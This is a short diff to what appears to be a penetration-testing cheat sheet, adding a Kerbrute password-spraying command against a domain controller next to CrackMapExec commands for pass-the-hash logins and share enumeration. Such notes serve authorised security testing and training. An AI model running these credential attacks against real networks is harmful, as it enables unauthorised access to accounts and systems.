@@ -326,6 +326,9 @@ PHP:
    `cme smb 172.16.1.0/24 -u Administrator -H 7facdc498ed1680c4fd1448319a8c04f --local-auth` 
 - Share enumeration with credentials:  
   `cme smb 172.16.1.0/24 -u bill -p 'password' --shares` 
+## Kerbrute   
+- Very performant password spraying tool:   
+  `# ./kerbrute_linux_amd64 passwordspray --dc 10.10.10.1 -d example.net userlist.txt 'F00B@r23!'`   
 
 ## File Transfer
 ### PowerShell
